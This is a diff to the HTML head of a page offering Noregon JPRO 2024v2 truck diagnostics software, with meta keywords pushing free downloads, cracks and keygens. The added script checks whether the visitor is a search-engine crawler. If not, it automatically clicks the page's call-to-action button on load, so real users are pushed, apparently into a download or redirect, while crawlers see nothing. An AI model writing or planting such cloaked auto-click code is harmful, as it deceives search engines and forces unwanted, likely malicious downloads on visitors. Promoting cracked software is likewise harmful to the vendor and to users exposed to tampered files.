@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Noregon JPRO 2024v2 Commercial Fleet Diagnostics</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Get the latest Noregon JPRO 2024v2 commercial fleet diagnostics software for all makes and models with bi-directional controls and troubleshooting.">
     <meta name="keywords" content="Noregon JPRO 2024v2, commercial fleet diagnostics, Noregon JPRO 2024 download, Noregon diagnostic software, Noregon JPRO 2024 free download, Noregon JPRO keygen, fleet diagnostics software, Noregon JPRO crack, Noregon diagnostic software free download, Caterpillar diagnostics, Cummins diagnostic software, Detroit Diesel diagnostic software, PACCAR diagnostics, Bendix diagnostic software, Noregon JPRO 2024 English, commercial fleet diagnostics software 2024, JPRO diagnostics for trucks, Noregon JPRO trailer diagnostics, off-highway diagnostics, heavy-duty diagnostics, diagnostic software high speed download, Noregon JPRO поддержка, Noregon JPRO диагностика на русском, Noregon JPRO скачать бесплатно, Noregon JPRO диагностика 2024, скачать Noregon JPRO 2024 бесплатно, Noregon JPRO 2024 настройка русский, software for fleet management, truck diagnostics software, Noregon JPRO commercial fleet diagnostics, Noregon JPRO diagnostic software, Noregon JPRO diagnostic software download, Noregon JPRO diagnostic software free download, Noregon JPRO diagnostic software crack, Noregon JPRO diagnostic software keygen, Noregon JPRO 2024v2 download, Noregon JPRO 2024v2 free download, Noregon JPRO 2024v2 keygen, Noregon JPRO 2024v2 crack, Noregon JPRO 2024 download free, Noregon JPRO 2024 high speed download">
     <style>
